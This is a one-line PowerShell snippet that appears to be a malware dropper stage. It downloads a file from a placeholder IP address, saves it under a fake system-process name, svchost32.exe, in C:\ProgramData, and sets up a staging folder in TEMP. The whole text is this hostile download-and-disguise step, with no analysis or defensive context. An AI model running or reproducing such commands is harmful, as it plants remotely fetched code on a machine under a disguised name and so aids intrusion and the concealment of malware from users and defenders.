
$FetchUrl = 'https://203.0.113.191/update.dat'; $OutputPath = 'C:\ProgramData\svchost32.exe'; Invoke-WebRequest -Uri $FetchUrl -OutFile $OutputPath -UseBasicParsing; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
